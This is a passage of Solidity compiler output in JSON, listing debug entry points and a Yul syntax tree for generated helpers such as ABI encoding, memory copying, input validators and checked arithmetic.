ding_t_string_memory_ptr_fromStack":{"entryPoint":3452,"id":null,"parameterSlots":2,"returnSlots":1},"checked_add_t_uint256":{"entryPoint":4485,"id":null,"parameterSlots":2,"returnSlots":1},"checked_mul_t_uint256":{"entryPoint":4364,"id":null,"parameterSlots":2,"returnSlots":1},"cleanup_t_address":{"entryPoint":3656,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_bool":{"entryPoint":3836,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":3624,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint256":{"entryPoint":3718,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint8":{"entryPoint":4015,"id":null,"parameterSlots":1,"returnSlots":1},"copy_memory_to_memory_with_cleanup":{"entryPoint":3469,"id":null,"parameterSlots":3,"returnSlots":0},"extract_byte_array_length":{"entryPoint":4268,"id":null,"parameterSlots":1,"returnSlots":1},"panic_error_0x11":{"entryPoint":4317,"id":null,"parameterSlots":0,"returnSlots":0},"panic_error_0x22":{"entryPoint":4221,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b":{"entryPoint":3619,"id":null,"parameterSlots":0,"returnSlots":0},"round_up_to_mul_of_32":{"entryPoint":3511,"id":null,"parameterSlots":1,"returnSlots":1},"validator_revert_t_address":{"entryPoint":3674,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_uint256":{"entryPoint":3728,"id":null,"parameterSlots":1,"returnSlots":0}},"generatedSources":[{"ast":{"nativeSrc":"0:7776:10","nodeType":"YulBlock","src":"0:7776:10","statements":[{"body":{"nativeSrc":"66:40:10","nodeType":"YulBlock","src":"66:40:10","statements":[{"nativeSrc":"77:22:10","nodeType":"YulAssignment","src":"77:22:10","value":{"arguments":[{"name":"value","nativeSrc":"93:5:10","nodeType":"YulIdentifier","src":"93:5:10"}],"functionName":{"name":"mload","nativeSrc":"87:5:10","nodeType":"YulIdentifier","src":"87:5:10"},"nativeSrc":"87:12:10","nodeType":"YulFunctionCall","src":"87:12:10"},"variableNames":[{"name":"length","nativeSrc":"77:6:10","nodeType":"YulIdentifier","src":"77:6:10"}]}]},"name":"array_length_t_string_memory_ptr","nativeSrc":"7:99:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"49:5:10","nodeType":"YulTypedName","src":"49:5:10","type":""}],"returnVariables":[{"name":"length","nativeSrc":"59:6:10","nodeType":"YulTypedName","src":"59:6:10","type":""}],"src":"7:99:10"},{"body":{"nativeSrc":"208:73:10","nodeType":"YulBlock","src":"208:73:10","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"225:3:10","nodeType":"YulIdentifier","src":"225:3:10"},{"name":"length","nativeSrc":"230:6:10","nodeType":"YulIdentifier","src":"230:6:10"}],"functionName":{"name":"mstore","nativeSrc":"218:6:10","nodeType":"YulIdentifier","src":"218:6:10"},"nativeSrc":"218:19:10","nodeType":"YulFunctionCall","src":"218:19:10"},"nativeSrc":"218:19:10","nodeType":"YulExpressionStatement","src":"218:19:10"},{"nativeSrc":"246:29:10","nodeType":"YulAssignment","src":"246:29:10","value":{"arguments":[{"name":"pos","nativeSrc":"265:3:10","nodeType":"YulIdentifier","src":"265:3:10"},{"kind":"number","nativeSrc":"270:4:10","nodeType":"YulLiteral","src":"270:4:10","type":"","value":"0x20"}],"functionName":{"name":"add","nativeSrc":"261:3:10","nodeType":"YulIdentifier","src":"261:3:10"},"nativeSrc":"261:14:10","nodeType":"YulFunctionCall","src":"261:14:10"},"variableNames":[{"name":"updated_pos","nativeSrc":"246:11:10","nodeType":"YulIdentifier","src":"246:11:10"}]}]},"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nativeSrc":"112:169:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nativeSrc":"180:3:10","nodeType":"YulTypedName","src":"180:3:10","type":""},{"name":"length","nativeSrc":"185:6:10","nodeType":"YulTypedName","src":"185:6:10","type":""}],"returnVariables":[{"name":"updated_pos","nativeSrc":"196:11:10","nodeType":"YulTypedName","src":"196:11:10","type":""}],"src":"112:169:10"},{"body":{"nativeSrc":"349:184:10","nodeType":"YulBlock","src":"349:184:10","statements":[{"nativeSrc":"359:10:10","nodeType":"YulVariableDeclaration","src":"359:10:10","value":{"kind":"number","nativeSrc":"368:1:10","nodeType":"YulLiteral","src":"368:1:10","type":"","value":"0"},"variables":[{"name":"i","nativeSrc":"363:1:10","nodeType":"YulTypedName","src":"363:1:10","type":""}]},{"body":{"nativeSrc":"428:63:10","nodeType":"YulBlock","src":"428:63:10","statements":[{"expression":{"arguments":[{"arguments":[{"name":"dst","nativeSrc":"453:3:10","nodeType":"YulIdentifier","src":"453:3:10"},{"name":"i","nativeSrc":"458:1:10","nodeType":"YulIdentifier","src":"458:1:10"}],"functionName":{"name":"add","nativeSrc":"449:3:10","nodeType":"YulIdentifier","src":"449:3:10"},"nativeSrc":"449:11:10","nodeType":"YulFunctionCall","src":"449:11:10"},{"arguments":[{"arguments":[{"name":"src","nativeSrc":"472:3:10","nodeType":"YulIdentifier","src":"472:3:10"},{"name":"i","nativeSrc":"477:1:10","nodeType":"YulIdentifier","src":"477:1:10"}],"functionName":{"name":"add","nativeSrc":"468:3:10","nodeType":"YulIdentifier","src":"468:3:10"},"nativeSrc":"468:11:10","nodeType":"YulFunctionCall","src":"468:11:10"}],"functionName":{"name":"mload","nativeSrc":"462:5:10","nodeType":"YulIdentifier","src":"462:5:10"},"nativeSrc":"462:18:10","nodeType":"YulFunctionCall","src":"462:18:10"}],"functionName":{"name":"mstore","nativeSrc":"442:6:10","nodeType":"YulIdentifier","src":"442:6:10"},"nativeSrc":"442:39:10","nodeType":"YulFunctionCall","src":"442:39:10"},"nativeSrc":"442:39:10","nodeType":"YulExpressionStatement","src":"442:39:10"}]},"condition":{"arguments":[{"name":"i","nativeSrc":"389:1:10","nodeType":"YulIdentifier","src":"389:1:10"},{"name":"length","nativeSrc":"392:6:10","nodeType":"YulIdentifier","src":"392:6:10"}],"functionName":{"name":"lt","nativeSrc":"386:2:10","nodeType":"YulIdentifier","src":"386:2:10"},"nativeSrc":"386:13:10","nodeType":"YulFunctionCall","src":"386:13:10"},"nativeSrc":"378:113:10","nodeType":"YulForLoop","post":{"nativeSrc":"400:19:10","nodeType":"YulBlock","src":"400:19:10","statements":[{"nativeSrc":"402:15:10","nodeType":"YulAssignment","src":"402:15:10","value":{"arguments":[{"name":"i","nativeSrc":"411:1:10","nodeType":"YulIdentifier","src":"411:1:10"},{"kind":"number","nativeSrc":"414:2:10","nodeType":"YulLiteral","src":"414:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"407:3:10","nodeType":"YulIdentifier","src":"407:3:10"},"nativeSrc":"407:10:10","nodeType":"YulFunctionCall","src":"407:10:10"},"variableNames":[{"name":"i","nativeSrc":"402:1:10","nodeType":"YulIdentifier","src":"402:1:10"}]}]},"pre":{"nativeSrc":"382:3:10","nodeType":"YulBlock","src":"382:3:10","statements":[]},"src":"378:113:10"},{"expression":{"arguments":[{"arguments":[{"name":"dst","nativeSrc":"511:3:10","nodeType":"YulIdentifier","src":"511:3:10"},{"name":"length","nativeSrc":"516:6:10","nodeType":"YulIdentifier","src":"516:6:10"}],"functionName":{"name":"add","nativeSrc":"507:3:10","nodeType":"YulIdentifier","src":"507:3:10"},"nativeSrc":"507:16:10","nodeType":"YulFunctionCall","src":"507:16:10"},{"kind":"number","nativeSrc":"525:1:10","nodeType":"YulLiteral","src":"525:1:10","type":"","value":"0"}],"functionName":{"name":"mstore","nativeSrc":"500:6:10","nodeType":"YulIdentifier","src":"500:6:10"},"nativeSrc":"500:27:10","nodeType":"YulFunctionCall","src":"500:27:10"},"nativeSrc":"500:27:10","nodeType":"YulExpressionStatement","src":"500:27:10"}]},"name":"copy_memory_to_memory_with_cleanup","nativeSrc":"287:246:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"src","nativeSrc":"331:3:10","nodeType":"YulTypedName","src":"331:3:10","type":""},{"name":"dst","nativeSrc":"336:3:10","nodeType":"YulTypedName","src":"336:3:10","type":""},{"name":"length","nativeSrc":"341:6:10","nodeType":"YulTypedName","src":"341:6:10","type":""}],"src":"287:246:10"},{"body":{"nativeSrc":"587:54:10","nodeType":"YulBlock","src":"587:54:10","statements":[{"nativeSrc":"597:38:10","nodeType":"YulAssignment","src":"597:38:10","value":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"615:5:10","nodeType":"YulIdentifier","src":"615:5:10"},{"kind":"number","nativeSrc":"622:2:10","nodeType":"YulLiteral","src":"622:2:10","type":"","value":"31"}],"functionName":{"name":"add","nativeSrc":"611:3:10","nodeType":"YulIdentifier","src":"611:3:10"},"nativeSrc":"611:14:10","nodeType":"YulFunctionCall","src":"611:14:10"},{"arguments":[{"kind":"number","nativeSrc":"631:2:10","nodeType":"YulLiteral","src":"631:2:10","type":"","value":"31"}],"functionName":{"name":"not","nativeSrc":"627:3:10","nodeType":"YulIdentifier","src":"627:3:10"},"nativeSrc":"627:7:10","nodeType":"YulFunctionCall","src":"627:7:10"}],"functionName":{"name":"and","nativeSrc":"607:3:10","nodeType":"YulIdentifier","src":"607:3:10"},"nativeSrc":"607:28:10","nodeType":"YulFunctionCall","src":"607:28:10"},"variableNames":[{"name":"result","nativeSrc":"597:6:10","nodeType":"YulIdentifier","src":"597:6:10"}]}]},"name":"round_up_to_mul_of_32","nativeSrc":"539:102:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"570:5:10","nodeType":"YulTypedName","src":"570:5:10","type":""}],"returnVariables":[{"name":"result","nativeSrc":"580:6:10","nodeType":"YulTypedName","src":"580:6:10","type":""}],"src":"539:102:10"},{"body":{"nativeSrc":"739:285:10","nodeType":"YulBlock","src":"739:285:10","statements":[{"nativeSrc":"749:53:10","nodeType":"YulVariableDeclaration","src":"749:53:10","value":{"arguments":[{"name":"value","nativeSrc":"796:5:10","nodeType":"YulIdentifier","src":"796:5:10"}],"functionName":{"name":"array_length_t_string_memory_ptr","nativeSrc":"763:32:10","nodeType":"YulIdentifier","src":"763:32:10"},"nativeSrc":"763:39:10","nodeType":"YulFunctionCall","src":"763:39:10"},"variables":[{"name":"length","nativeSrc":"753:6:10","nodeType":"YulTypedName","src":"753:6:10","type":""}]},{"nativeSrc":"811:78:10","nodeType":"YulAssignment","src":"811:78:10","value":{"arguments":[{"name":"pos","nativeSrc":"877:3:10","nodeType":"YulIdentifier","src":"877:3:10"},{"name":"length","nativeSrc":"882:6:10","nodeType":"YulIdentifier","src":"882:6:10"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nativeSrc":"818:58:10","nodeType":"YulIdentifier","src":"818:58:10"},"nativeSrc":"818:71:10","nodeType":"YulFunctionCall","src":"818:71:10"},"variableNames":[{"name":"pos","nativeSrc":"811:3:10","nodeType":"YulIdentifier","src":"811:3:10"}]},{"expression":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"937:5:10","nodeType":"YulIdentifier","src":"937:5:10"},{"kind":"number","nativeSrc":"944:4:10","nodeType":"YulLiteral","src":"944:4:10","type":"","value":"0x20"}],"functionName":{"name":"add","nativeSrc":"933:3:10","nodeType":"YulIdentifier","src":"933:3:10"},"nativeSrc":"933:16:10","nodeType":"YulFunctionCall","src":"933:16:10"},{"name":"pos","nativeSrc":"951:3:10","nodeType":"YulIdentifier","src":"951:3:10"},{"name":"length","nativeSrc":"956:6:10","nodeType":"YulIdentifier","src":"956:6:10"}],"functionName":{"name":"copy_memory_to_memory_with_cleanup","nativeSrc":"898:34:10","nodeType":"YulIdentifier","src":"898:34:10"},"nativeSrc":"898:65:10","nodeType":"YulFunctionCall","src":"898:65:10"},"nativeSrc":"898:65:10","nodeType":"YulExpressionStatement","src":"898:65:10"},{"nativeSrc":"972:46:10","nodeType":"YulAssignment","src":"972:46:10","value":{"arguments":[{"name":"pos","nativeSrc":"983:3:10","nodeType":"YulIdentifier","src":"983:3:10"},{"arguments":[{"name":"length","nativeSrc":"1010:6:10","nodeType":"YulIdentifier","src":"1010:6:10"}],"functionName":{"name":"round_up_to_mul_of_32","nativeSrc":"988:21:10","nodeType":"YulIdentifier","src":"988:21:10"},"nativeSrc":"988:29:10","nodeType":"YulFunctionCall","src":"988:29:10"}],"functionName":{"name":"add","nativeSrc":"979:3:10","nodeType":"YulIdentifier","src":"979:3:10"},"nativeSrc":"979:39:10","nodeType":"YulFunctionCall","src":"979:39:10"},"variableNames":[{"name":"end","nativeSrc":"972:3:10","nodeType":"YulIdentifier","src":"972:3:10"}]}]},"name":"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack","nativeSrc":"647:377:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"720:5:10","nodeType":"YulTypedName","src":"720:5:10","type":""},{"name":"pos","nativeSrc":"727:3:10","nodeType":"YulTypedName","src":"727:3:10","type":""}],"returnVariables":[{"name":"end","nativeSrc":"735:3:10","nodeType":"YulTypedName","src":"735:3:10","type":""}],"src":"647:377:10"},{"body":{"nativeSrc":"1148:195:10","nodeType":"YulBlock","src":"1148:195:10","statements":[{"nativeSrc":"1158:26:10","nodeType":"YulAssignment","src":"1158:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"1170:9:10","nodeType":"YulIdentifier","src":"1170:9:10"},{"kind":"number","nativeSrc":"1181:2:10","nodeType":"YulLiteral","src":"1181:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"1166:3:10","nodeType":"YulIdentifier","src":"1166:3:10"},"nativeSrc":"1166:18:10","nodeType":"YulFunctionCall","src":"1166:18:10"},"variableNames":[{"name":"tail","nativeSrc":"1158:4:10","nodeType":"YulIdentifier","src":"1158:4:10"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"1205:9:10","nodeType":"YulIdentifier","src":"1205:9:10"},{"kind":"number","nativeSrc":"1216:1:10","nodeType":"YulLiteral","src":"1216:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"1201:3:10","nodeType":"YulIdentifier","src":"1201:3:10"},"nativeSrc":"1201:17:10","nodeType":"YulFunctionCall","src":"1201:17:10"},{"arguments":[{"name":"tail","nativeSrc":"1224:4:10","nodeType":"YulIdentifier","src":"1224:4:10"},{"name":"headStart","nativeSrc":"1230:9:10","nodeType":"YulIdentifier","src":"1230:9:10"}],"functionName":{"name":"sub","nativeSrc":"1220:3:10","nodeType":"YulIdentifier","src":"1220:3:10"},"nativeSrc":"1220:20:10","nodeType":"YulFunctionCall","src":"1220:20:10"}],"functionName":{"name":"mstore","nativeSrc":"1194:6:10","nodeType":"YulIdentifier","src":"1194:6:10"},"nativeSrc":"1194:47:10","nodeType":"YulFunctionCall","src":"1194:47:10"},"nativeSrc":"1194:47:10","nodeType":"YulExpressionStatement","src":"1194:47:10"},{"nativeSrc":"1250:86:10","nodeType":"YulAssignment","src":"1250:86:10","value":{"arguments":[{"name":"value0","nativeSrc":"1322:6:10","nodeType":"YulIdentifier","src":"1322:6:10"},{"name":"tail","nativeSrc":"1331:4:10","nodeType":"YulIdentifier","src":"1331:4:10"}],"functionName":{"name":"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack","nativeSrc":"1258:63:10","nodeType":"YulIdentifier","src":"1258:63:10"},"nativeSrc":"1258:78:10","nodeType":"YulFunctionCall","src":"1258:78:10"},"variableNames":[{"name":"tail","nativeSrc":"1250:4:10","nodeType":"YulIdentifier","src":"1250:4:10"}]}]},"name":"abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed","nativeSrc":"1030:313:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"1120:9:10","nodeType":"YulTypedName","src":"1120:9:10","type":""},{"name":"value0","nativeSrc":"1132:6:10","nodeType":"YulTypedName","src":"1132:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"1143:4:10","nodeType":"YulTypedName","src":"1143:4:10","type":""}],"src":"1030:313:10"},{"body":{"nativeSrc":"1389:35:10","nodeType":"YulBlock","src":"1389:35:10","statements":[{"nativeSrc":"1399:19:10","nodeType":"YulAssignment","src":"1399:19:10","value":{"arguments":[{"kind":"number","nativeSrc":"1415:2:10","nodeType":"YulLiteral","src":"1415:2:10","type":"","value":"64"}],"functionName":{"name":"mload","nativeSrc":"1409:5:10","nodeType":"YulIdentifier","src":"1409:5:10"},"nativeSrc":"1409:9:10","nodeType":"YulFunctionCall","src":"1409:9:10"},"variableNames":[{"name":"memPtr","nativeSrc":"1399:6:10","nodeType":"YulIdentifier","src":"1399:6:10"}]}]},"name":"allocate_unbounded","nativeSrc":"1349:75:10","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"memPtr","nativeSrc":"1382:6:10","nodeType":"YulTypedName","src":"1382:6:10","type":""}],"src":"1349:75:10"},{"body":{"nativeSrc":"1519:28:10","nodeType":"YulBlock","src":"1519:28:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"1536:1:10","nodeType":"YulLiteral","src":"1536:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"1539:1:10","nodeType":"YulLiteral","src":"1539:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"1529:6:10","nodeType":"YulIdentifier","src":"1529:6:10"},"nativeSrc":"1529:12:10","nodeType":"YulFunctionCall","src":"1529:12:10"},"nativeSrc":"1529:12:10","nodeType":"YulExpressionStatement","src":"1529:12:10"}]},"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"1430:117:10","nodeType":"YulFunctionDefinition","src":"1430:117:10"},{"body":{"nativeSrc":"1642:28:10","nodeType":"YulBlock","src":"1642:28:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"1659:1:10","nodeType":"YulLiteral","src":"1659:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"1662:1:10","nodeType":"YulLiteral","src":"1662:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"1652:6:10","nodeType":"YulIdentifier","src":"1652:6:10"},"nativeSrc":"1652:12:10","nodeType":"YulFunctionCall","src":"1652:12:10"},"nativeSrc":"1652:12:10","nodeType":"YulExpressionStatement","src":"1652:12:10"}]},"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nativeSrc":"1553:117:10","nodeType":"YulFunctionDefinition","src":"1553:117:10"},{"body":{"nativeSrc":"1721:81:10","nodeType":"YulBlock","src":"1721:81:10","statements":[{"nativeSrc":"1731:65:10","nodeType":"YulAssignment","src":"1731:65:10","value":{"arguments":[{"name":"value","nativeSrc":"1746:5:10","nodeType":"YulIdentifier","src":"1746:5:10"},{"kind":"number","nativeSrc":"1753:42:10","nodeType":"YulLiteral","src":"1753:42:10","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nativeSrc":"1742:3:10","nodeType":"YulIdentifier","src":"1742:3:10"},"nativeSrc":"1742:54:10","nodeType":"YulFunctionCall","src":"1742:54:10"},"variableNames":[{"name":"cleaned","nativeSrc":"1731:7:10","nodeType":"YulIdentifier","src":"1731:7:10"}]}]},"name":"cleanup_t_uint160","nativeSrc":"1676:126:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1703:5:10","nodeType":"YulTypedName","src":"1703:5:10","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"1713:7:10","nodeType":"YulTypedName","src":"1713:7:10","type":""}],"src":"1676:126:10"},{"body":{"nativeSrc":"1853:51:10","nodeType":"YulBlock","src":"1853:51:10","statements":[{"nativeSrc":"1863:35:10","nodeType":"YulAssignment","src":"1863:35:10","value":{"arguments":[{"name":"value","nativeSrc":"1892:5:10","nodeType":"YulIdentifier","src":"1892:5:10"}],"functionName":{"name":"cleanup_t_uint160","nativeSrc":"1874:17:10","nodeType":"YulIdentifier","src":"1874:17:10"},"nativeSrc":"1874:24:10","nodeType":"YulFunctionCall","src":"1874:24:10"},"variableNames":[{"name":"cleaned","nativeSrc":"1863:7:10","nodeType":"YulIdentifier","src":"1863:7:10"}]}]},"name":"cleanup_t_address","nativeSrc":"1808:96:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1835:5:10","nodeType":"YulTypedName","src":"1835:5:10","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"1845:7:10","nodeType":"YulTypedName","src":"1845:7:10","type":""}],"src":"1808:96:10"},{"body":{"nativeSrc":"1953:79:10","nodeType":"YulBlock","src":"1953:79:10","statements":[{"body":{"nativeSrc":"2010:16:10","nodeType":"YulBlock","src":"2010:16:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"2019:1:10","nodeType":"YulLiteral","src":"2019:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"2022:1:10","nodeType":"YulLiteral","src":"2022:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"2012:6:10","nodeType":"YulIdentifier","src":"2012:6:10"},"nativeSrc":"2012:12:10","nodeType":"YulFunctionCall","src":"2012:12:10"},"nativeSrc":"2012:12:10","nodeType":"YulExpressionStatement","src":"2012:12:10"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"1976:5:10","nodeType":"YulIdentifier","src":"1976:5:10"},{"arguments":[{"name":"value","nativeSrc":"2001:5:10","nodeType":"YulIdentifier","src":"2001:5:10"}],"functionName":{"name":"cleanup_t_address","nativeSrc":"1983:17:10","nodeType":"YulIdentifier","src":"1983:17:10"},"nativeSrc":"1983:24:10","nodeType":"YulFunctionCall","src":"1983:24:10"}],"functionName":{"name":"eq","nativeSrc":"1973:2:10","nodeType":"YulIdentifier","src":"1973:2:10"},"nativeSrc":"1973:35:10","nodeType":"YulFunctionCall","src":"1973:35:10"}],"functionName":{"name":"iszero","nativeSrc":"1966:6:10","nodeType":"YulIdentifier","src":"1966:6:10"},"nativeSrc":"1966:43:10","nodeType":"YulFunctionCall","src":"1966:43:10"},"nativeSrc":"1963:63:10","nodeType":"YulIf","src":"1963:63:10"}]},"name":"validator_revert_t_address","nativeSrc":"1910:122:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1946:5:10","nodeType":"YulTypedName","src":"1946:5:10","type":""}],"src":"1910:122:10"},{"body":{"nativeSrc":"2090:87:10","nodeType":"YulBlock","src":"2090:87:10","statements":[{"nativeSrc":"2100:29:10","nodeType":"YulAssignment","src":"2100:29:10","value":{"arguments":[{"name":"offset","nativeSrc":"2122:6:10","nodeType":"YulIdentifier","src":"2122:6:10"}],"functionName":{"name":"calldataload","nativeSrc":"2109:12:10","nodeType":"YulIdentifier","src":"2109:12:10"},"nativeSrc":"2109:20:10","nodeType":"YulFunctionCall","src":"2109:20:10"},"variableNames":[{"name":"value","nativeSrc":"2100:5:10","nodeType":"YulIdentifier","src":"2100:5:10"}]},{"expression":{"arguments":[{"name":"value","nativeSrc":"2165:5:10","nodeType":"YulIdentifier","src":"2165:5:10"}],"functionName":{"name":"validator_revert_t_address","nativeSrc":"2138:26:10","nodeType":"YulIdentifier","src":"2138:26:10"},"nativeSrc":"2138:33:10","nodeType":"YulFunctionCall","src":"2138:33:10"},"nativeSrc":"2138:33:10","nodeType":"YulExpressionStatement","src":"2138:33:10"}]},"name":"abi_decode_t_address","nativeSrc":"2038:139:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nativeSrc":"2068:6:10","nodeType":"YulTypedName","src":"2068:6:10","type":""},{"name":"end","nativeSrc":"2076:3:10","nodeType":"YulTypedName","src":"2076:3:10","type":""}],"returnVariables":[{"name":"value","nativeSrc":"2084:5:10","nodeType":"YulTypedName","src":"2084:5:10","type":""}],"src":"2038:139:10"},{"body":{"nativeSrc":"2228:32:10","nodeType":"YulBlock","src":"2228:32:10","statements":[{"nativeSrc":"2238:16:10","nodeType":"YulAssignment","src":"2238:16:10","value":{"name":"value","nativeSrc":"2249:5:10","nodeType":"YulIdentifier","src":"2249:5:10"},"variableNames":[{"name":"cleaned","nativeSrc":"2238:7:10","nodeType":"YulIdentifier","src":"2238:7:10"}]}]},"name":"cleanup_t_uint256","nativeSrc":"2183:77:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"2210:5:10","nodeType":"YulTypedName","src":"2210:5:10","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"2220:7:10","nodeType":"YulTypedName","src":"2220:7:10","type":""}],"src":"2183:77:10"},{"body":{"nativeSrc":"2309:79:10","nodeType":"YulBlock","src":"2309:79:10","statements":[{"body":{"nativeSrc":"2366:16:10","nodeType":"YulBlock","src":"2366:16:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"2375:1:10","nodeType":"YulLiteral","src":"2375:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"2378:1:10","nodeType":"YulLiteral","src":"2378:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"2368:6:10","nodeType":"YulIdentifier","src":"2368:6:10"},"nativeSrc":"2368:12:10","nodeType":"YulFunctionCall","src":"2368:12:10"},"nativeSrc":"2368:12:10","nodeType":"YulExpressionStatement","src":"2368:12:10"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"2332:5:10","nodeType":"YulIdentifier","src":"2332:5:10"},{"arguments":[{"name":"value","nativeSrc":"2357:5:10","nodeType":"YulIdentifier","src":"2357:5:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"2339:17:10","nodeType":"YulIdentifier","src":"2339:17:10"},"nativeSrc":"2339:24:10","nodeType":"YulFunctionCall","src":"2339:24:10"}],"functionName":{"name":"eq","nativeSrc":"2329:2:10","nodeType":"YulIdentifier","src":"2329:2:10"},"nativeSrc":"2329:35:10","nodeType":"YulFunctionCall","src":"2329:35:10"}],"functionName":{"name":"iszero","nativeSrc":"2322:6:10","nodeType":"YulIdentifier","src":"2322:6:10"},"nativeSrc":"2322:43:10","nodeType":"YulFunctionCall","src":"2322:43:10"},"nativeSrc":"2319:63:10","nodeType":"YulIf","src":"2319:63:10"}]},"name":"validator_revert_t_uint256","nativeSrc":"2266:122:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"2302:5:10","nodeType":"YulTypedName","src":"2302:5:10","type":""}],"src":"2266:122:10"},{"body":{"nativeSrc":"2446:87:10","nodeType":"YulBlock","src":"2446:87:10","statements":[{"nativeSrc":"2456:29:10","nodeType":"YulAssignment","src":"2456:29:10","value":{"arguments":[{"name":"offset","nativeSrc":"2478:6:10","nodeType":"YulIdentifier","src":"2478:6:10"}],"functionName":{"name":"calldataload","nativeSrc":"2465:12:10","nodeType":"YulIdentifier","src":"2465:12:10"},"nativeSrc":"2465:20:10","nodeType":"YulFunctionCall","src":"2465:20:10"},"variableNames":[{"name":"value","nativeSrc":"2456:5:10","nodeType":"YulIdentifier","src":"2456:5:10"}]},{"expression":{"arguments":[{"name":"value","nativeSrc":"2521:5:10","nodeType":"YulIdentifier","src":"2521:5:10"}],"functionName":{"name":"validator_revert_t_uint256","nativeSrc":"2494:26:10","nodeType":"YulIdentifier","src":"2494:26:10"},"nativeSrc":"2494:33:10","nodeType":"YulFunctionCall","src":"2494:33:10"},"nativeSrc":"2494:33:10","nodeType":"YulExpressionStatement","src":"2494:33:10"}]},"name":"abi_decode_t_uint256","nativeSrc":"2394:139:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nativeSrc":"2424:6:10","nodeType":"YulTypedName","src":"2424:6:10","type":""},{"name":"end","nativeSrc":"2432:3:10","nodeType":"YulTypedName","src":"2432:3:10","type":""}],"returnVariables":[{"name":"value","nativeSrc":"2440:5:10","nodeType":"YulTypedName","src":"2440:5:10","type":""}],"src":"2394:139:10"},{"body":{"nativeSrc":"2622:391:10","nodeType":"YulBlock","src":"2622:391:10","statements":[{"body":{"nativeSrc":"2668:83:10","nodeType":"YulBlock","src":"2668:83:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"2670:77:10","nodeType":"YulIdentifier","src":"2670:77:10"},"nativeSrc":"2670:79:10","nodeType":"YulFunctionCall","src":"2670:79:10"},"nativeSrc":"2670:79:10","nodeType":"YulExpressionStatement","src":"2670:79:10"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nativeSrc":"2643:7:10","nodeType":"YulIdentifier","src":"2643:7:10"},{"name":"headStart","nativeSrc":"2652:9:10","nodeType":"YulIdentifier","src":"2652:9:10"}],"functionName":{"name":"sub","nativeSrc":"2639:3:10","nodeType":"YulIdentifier","src":"2639:3:10"},"nativeSrc":"2639:23:10","nodeType":"YulFunctionCall","src":"2639:23:10"},{"kind":"number","nativeSrc":"2664:2:10","nodeType":"YulLiteral","src":"2664:2:10","type":"","value":"64"}],"functionName":{"name":"slt","nativeSrc":"2635:3:10","nodeType":"YulIdentifier","src":"2635:3:10"},"nativeSrc":"2635:32:10","nodeType":"YulFunctionCall","src":"2635:32:10"},"nativeSrc":"2632:119:10","nodeType":"YulIf","src":"2632:119:10"},{"nativeSrc":"2761:117:10","nodeType":"YulBlock","src":"2761:117:10","statements":[{"nativeSrc":"2776:15:10","nodeType":"YulVariableDeclaration","src":"2776:15:10","value":{"kind":"number","na